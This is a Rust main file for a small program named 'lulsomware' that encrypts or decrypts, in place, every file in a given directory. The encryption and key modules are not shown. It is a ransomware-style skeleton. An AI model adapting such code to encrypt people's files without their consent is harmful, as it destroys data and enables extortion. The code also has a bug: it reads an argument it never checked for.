use std::env;
use std::fs;
use std::fs::{OpenOptions};
use std::process::exit;

mod key_utils;
mod encryption;

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        exit_with_help();
    }

    let encryption_key = key_utils::set_encryption_key(&args);

    // TODO: add recursion for files in nested folder structures
    let action = args[1].as_str();
    let working_directory = args[2].as_str();
    let directory_entries = fs::read_dir(working_directory).expect("Can't read");

    println!("Command: {} {}", action, working_directory);
    for entry in directory_entries {
        let dir_entry = entry.unwrap();
        let mut file = OpenOptions::new().read(true).write(true).open(dir_entry.path().as_os_str()).unwrap();
        println!("{}::{}...", action, dir_entry.file_name().into_string().unwrap());

        if action == "encrypt" {
            encryption::encrypt_file(&mut file, &encryption_key);
        } else if action == "decrypt" {
            encryption::decrypt_file(&mut file, &encryption_key);
        }

        print!("{}::{} OK", action, dir_entry.file_name().into_string().unwrap());
        println!();
    }
}

fn exit_with_help() {
    println!("Encrypt: lulsomware.exe encrypt [directory]");
    println!("Decrypt: lulsomware.exe decrypt [directory] [key]");
    exit(1);
}


